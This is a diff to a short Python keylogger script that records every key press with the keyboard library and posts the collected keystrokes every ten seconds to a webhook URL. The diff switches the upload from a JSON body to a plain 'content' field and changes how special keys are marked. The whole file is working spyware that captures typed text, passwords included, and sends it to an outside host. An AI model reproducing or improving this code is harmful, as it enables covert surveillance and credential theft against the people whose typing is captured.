@@ -1,6 +1,5 @@
 import keyboard
 import requests
-import json
 import threading
 
 logged_keystrokes = ""
@@ -10,8 +9,8 @@ logging_interval = 10
 def send_post_req():
     global logged_keystrokes
     try:
-        payload = json.dumps({"Keyboard input": logged_keystrokes})
-        requests.post(f"{webhookUrl}", data=payload, headers={"Content-Type": "application/json"})
+        payload = {"content": logged_keystrokes}
+        requests.post(f"{webhookUrl}", data=payload, headers={"Content-Type": "text/plain"})
         logged_keystrokes = ""  
         timer = threading.Timer(logging_interval, send_post_req)
         timer.start()
@@ -21,11 +20,10 @@ def send_post_req():
 def log_keys(e):
     global logged_keystrokes
     if len(e.name) > 1:
-        logged_keystrokes += f"<{e.name}>"
+        logged_keystrokes += f"_{e.name}_"
     else:
-        logged_keystrokes += e.name
+        logged_keystrokes += e.name 
 
 keyboard.on_press(log_keys)
-
 send_post_req()
 keyboard.wait()  
